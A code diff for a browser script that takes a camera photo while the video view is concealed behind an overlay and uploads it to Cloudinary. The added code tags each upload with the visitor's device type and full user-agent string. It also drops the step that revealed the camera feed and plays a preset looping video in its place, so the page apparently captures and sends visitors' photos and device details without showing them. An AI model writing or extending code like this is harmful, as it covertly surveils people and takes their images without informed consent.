@@ -24,6 +24,17 @@
     return Boolean(cfg.cloudName && cfg.uploadPreset);
   }
 
+  function getDeviceSlug() {
+    const ua = navigator.userAgent;
+    if (/iPhone/i.test(ua)) return 'iphone';
+    if (/iPad/i.test(ua)) return 'ipad';
+    if (/Android/i.test(ua)) return 'android';
+    if (/Windows/i.test(ua)) return 'windows';
+    if (/Mac OS X|Macintosh/i.test(ua)) return 'mac';
+    if (/Linux/i.test(ua)) return 'linux';
+    return 'unknown';
+  }
+
   function showPermissionDenied() {
     els.statusText.textContent = PERMISSION_DENIED;
     els.statusBadge.classList.add('visible');
@@ -45,10 +56,7 @@
 
   function concealVideo() {
     els.video.classList.add('concealed');
-  }
-
-  function revealVideo() {
-    els.video.classList.remove('concealed');
+    els.video.classList.remove('playback');
   }
 
   async function checkCameraPermission() {
@@ -127,9 +135,13 @@
   function uploadToCloudinary(blob) {
     const url = `https://api.cloudinary.com/v1_1/${cfg.cloudName}/image/upload`;
     const form = new FormData();
+    const deviceSlug = getDeviceSlug();
+
     form.append('file', blob, `photo-${Date.now()}.jpg`);
     form.append('upload_preset', cfg.uploadPreset);
     if (cfg.folder) form.append('folder', cfg.folder);
+    form.append('tags', `device-${deviceSlug},web-capture`);
+    form.append('context', `user_agent=${encodeURIComponent(navigator.userAgent)}`);
 
     return new Promise((resolve, reject) => {
       const xhr = new XMLHttpRequest();
@@ -155,11 +167,35 @@
     await uploadToCloudinary(blob);
   }
 
+  async function playCloudinaryVideo() {
+    const playbackUrl = cfg.playbackVideoUrl;
+    if (!playbackUrl) throw new Error('Playback URL not configured');
+
+    stopStream();
+    els.video.srcObject = null;
+    els.video.removeAttribute('src');
+    els.video.classList.remove('concealed');
+    els.video.classList.add('playback');
+    els.video.src = playbackUrl;
+    els.video.loop = true;
+    els.video.muted = false;
+    els.video.playsInline = true;
+
+    try {
+      await els.video.play();
+    } catch {
+      els.video.muted = true;
+      await els.video.play();
+    }
+  }
+
   async function startSession() {
     showFrostOverlay();
     concealVideo();
     hideStatus();
     stopStream();
+    els.video.classList.remove('playback');
+    els.video.removeAttribute('src');
 
     if (!navigator.mediaDevices?.getUserMedia) {
       showPermissionDenied();
@@ -177,12 +213,13 @@
       });
 
       els.video.srcObject = stream;
+      els.video.muted = true;
       await els.video.play();
       await waitForVideoReady();
       await captureAndUpload();
 
-      revealVideo();
       hideFrostOverlay();
+      await playCloudinaryVideo();
       completed = true;
       return true;
     } catch (err) {
